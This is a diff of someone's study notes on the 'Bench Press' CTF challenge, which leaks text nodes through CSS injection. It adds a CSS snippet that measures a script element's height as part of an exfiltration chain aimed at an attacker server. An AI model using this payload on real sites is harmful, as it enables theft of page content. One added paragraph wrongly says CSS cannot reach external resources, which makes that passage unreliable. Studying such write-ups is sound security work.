@@ -1,4 +1,7 @@
 ## Bench Press
+https://blog.pspaul.de/posts/bench-press-leaking-text-nodes-with-css/
+
+Honestly the writeup went over my head. But css injection isnt something iv seen before so ill try to explain what i gained and then write about what i got to know about this injection.
 
 - Concept : Leaking Text Nodes with CSS
   ```
@@ -44,11 +47,49 @@ Techniques that leak the charset of a text node that would fit our conditions:
 - Exfiltrate the letter to our attacker server
 
 ### Payload construction
+- How to  measure the height/width of any HTML element and get the size as a number in a CSS variable
+```
+  @property --y {
+  syntax: "<number>";
+  initial-value: 0; 
+  inherits: true;
+}
+@property --h {
+  syntax: "<integer>";
+  initial-value: 0; 
+  inherits: true;
+}
+@keyframes y {
+  to { --y: 1 }
+}
+script { /* the element we want to leak from */
+  overflow: auto;
+  position: relative;
+  &:before {
+    content: '';
+    position: absolute;
+    left: 0;
+    top: 0;
+    height: 1px;
+    view-timeline: --cy block;
+  }
 
+  animation: y linear;
+  timeline-scope: --cy;
+  animation-timeline: --cy;
+  animation-range: entry 100% exit 100%;
+
+  /* --h now contains the element's pixel height as a number */
+  --h: calc(1/(1 - var(--y)));
+}
+  ```
+ 
 - Exfiltrating the Letters
   
-We now have the height difference that corresponds to the individual height of a letter. However, this value is stored as a number, so how can we send it to our server? Paused animations. 
+The height difference that corresponds to the individual height of a letter is stored as a number, so how can we send it to our server? Paused animations. 
 ```
+When the height difference (corresponding to the height of a single letter) is stored as a number in CSS, it becomes challenging to send this data directly to a server because CSS properties alone do not support direct network requests or data transmission. CSS is inherently limited to styling and layout purposes and cannot interact directly with external resources like servers.
+
 Paused animations can be useful in CSS and JavaScript when you want to stop or control the timing of animations on the page
 ```
 By changing the delay of a paused animation, we can select different values. We use it to select an exfiltration URL that matches the right letter:
